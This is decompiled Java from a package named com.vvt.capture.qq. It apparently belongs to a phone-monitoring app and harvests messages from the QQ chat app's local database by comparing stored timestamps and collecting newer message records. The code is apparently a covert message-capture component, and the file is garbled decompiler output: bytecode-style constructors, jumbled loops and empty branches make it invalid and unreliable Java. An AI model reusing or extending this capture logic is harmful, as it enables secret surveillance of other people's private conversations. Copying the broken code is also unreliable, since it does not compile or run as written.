package com.vvt.capture.qq.a;

import com.vvt.base.capture.g;
import com.vvt.capture.qq.QQData;
import com.vvt.capture.qq.QQEventReference;
import com.vvt.capture.qq.c;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Set;

public class f
  implements com.vvt.base.capture.f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private com.vvt.base.b d;
  
  public f(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    for (;;)
    {
      try
      {
        localObject = com.vvt.n.a.d.a.a();
        boolean bool2 = a;
        if (bool2) {}
        bool2 = com.vvt.ag.b.a((String)localObject);
        if (bool2) {
          continue;
        }
        File localFile = new java/io/File;
        localFile.<init>((String)localObject);
        bool2 = localFile.exists();
        if (bool2) {
          localHashMap = a.a((String)localObject);
        }
      }
      catch (Exception localException)
      {
        Object localObject;
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        continue;
      }
      localObject = new com/vvt/capture/qq/QQEventReference;
      ((QQEventReference)localObject).<init>();
      ((QQEventReference)localObject).setReference(localHashMap);
      bool1 = a;
      if (bool1) {}
      return (g)localObject;
      bool3 = b;
      if (!bool3) {}
    }
  }
  
  public List a(int paramInt)
  {
    i = a;
    if (i != 0) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    for (;;)
    {
      try
      {
        String str = com.vvt.n.a.d.a.a();
        i = a;
        if (i != 0) {}
        i = com.vvt.ag.b.a(str);
        if (i != 0) {
          continue;
        }
        Object localObject1 = a.a(str);
        ArrayList localArrayList2 = new java/util/ArrayList;
        localArrayList2.<init>();
        localObject1 = ((HashMap)localObject1).entrySet();
        Iterator localIterator = ((Set)localObject1).iterator();
        j = paramInt;
        i = localIterator.hasNext();
        if (i == 0) {
          continue;
        }
        localObject1 = localIterator.next();
        Object localObject2 = localObject1;
        localObject2 = (Map.Entry)localObject1;
        Object localObject3 = localObject2;
        localObject1 = ((Map.Entry)localObject2).getValue();
        localObject1 = (Long)localObject1;
        long l1 = ((Long)localObject1).longValue();
        localObject1 = ((Map.Entry)localObject2).getKey();
        localObject1 = (String)localObject1;
        i = a;
        if (i != 0) {}
        long l2 = 0L;
        i = l1 < l2;
        if (i <= 0) {
          continue;
        }
        localObject1 = this.c;
        Object localObject4 = ((Map.Entry)localObject3).getKey();
        localObject4 = (String)localObject4;
        localObject3 = ((Map.Entry)localObject3).getValue();
        localObject3 = (Long)localObject3;
        long l3 = ((Long)localObject3).longValue();
        com.vvt.base.b localb = this.d;
        localObject1 = c.a((String)localObject1, str, (String)localObject4, l3, localb);
        boolean bool = a;
        if (bool) {}
        int k = ((ArrayList)localObject1).size();
        if (k <= 0) {
          continue;
        }
        localObject3 = ((ArrayList)localObject1).iterator();
        k = j;
        i = ((Iterator)localObject3).hasNext();
        if (i != 0)
        {
          localObject1 = ((Iterator)localObject3).next();
          localObject1 = (QQData)localObject1;
          if (k > 0)
          {
            localArrayList2.add(localObject1);
            k += -1;
            continue;
          }
        }
        i = k;
      }
      catch (Exception localException)
      {
        int j;
        i = b;
        if (i == 0) {
          continue;
        }
        continue;
        i = j;
        continue;
      }
      j = i;
    }
    i = b;
    if (i != 0) {}
    i = a;
    if (i != 0) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof QQEventReference;
    Object localObject1;
    Object localObject4;
    Object localObject5;
    long l1;
    if (bool1)
    {
      bool1 = paramg2 instanceof QQEventReference;
      if (bool1) {
        try
        {
          paramg1 = (QQEventReference)paramg1;
          paramg2 = (QQEventReference)paramg2;
          localObject1 = new java/util/HashMap;
          ((HashMap)localObject1).<init>();
          Object localObject2 = paramg1.getReference();
          localObject2 = ((HashMap)localObject2).entrySet();
          localObject4 = ((Set)localObject2).iterator();
          for (;;)
          {
            bool1 = ((Iterator)localObject4).hasNext();
            if (!bool1) {
              break label274;
            }
            localObject2 = ((Iterator)localObject4).next();
            localObject2 = (Map.Entry)localObject2;
            localObject5 = ((Map.Entry)localObject2).getKey();
            localObject5 = (String)localObject5;
            localObject2 = ((Map.Entry)localObject2).getValue();
            localObject2 = (Long)localObject2;
            l1 = ((Long)localObject2).longValue();
            bool1 = a;
            if (bool1) {}
            localObject2 = paramg2.getReference();
            bool1 = ((HashMap)localObject2).containsKey(localObject5);
            if (!bool1) {
              break;
            }
            localObject2 = paramg2.getReference();
            localObject2 = ((HashMap)localObject2).get(localObject5);
            localObject2 = (Long)localObject2;
            long l2 = ((Long)localObject2).longValue();
            bool1 = l2 < l1;
            if (bool1)
            {
              localObject2 = Long.valueOf(l1);
              ((HashMap)localObject1).put(localObject5, localObject2);
            }
          }
          bool1 = a;
        }
        catch (Exception localException)
        {
          bool1 = b;
          if (!bool1) {}
        }
      }
    }
    for (;;)
    {
      if (bool1) {}
      return localArrayList;
      l1 = 0L;
      Object localObject3 = Long.valueOf(l1);
      ((HashMap)localObject1).put(localObject5, localObject3);
      break;
      label274:
      int i = ((HashMap)localObject1).size();
      if (i > 0)
      {
        localObject3 = ((HashMap)localObject1).entrySet();
        Iterator localIterator = ((Set)localObject3).iterator();
        for (;;)
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject3 = localIterator.next();
          Object localObject6 = localObject3;
          localObject6 = (Map.Entry)localObject3;
          localObject4 = localObject6;
          localObject5 = com.vvt.n.a.d.a.a();
          localObject3 = this.c;
          localObject1 = ((Map.Entry)localObject6).getKey();
          localObject1 = (String)localObject1;
          localObject4 = ((Map.Entry)localObject6).getValue();
          localObject4 = (Long)localObject4;
          long l3 = ((Long)localObject4).longValue();
          com.vvt.base.b localb = this.d;
          localObject3 = c.a((String)localObject3, (String)localObject5, (String)localObject1, l3, localb);
          localArrayList.addAll((Collection)localObject3);
        }
      }
      boolean bool2 = a;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */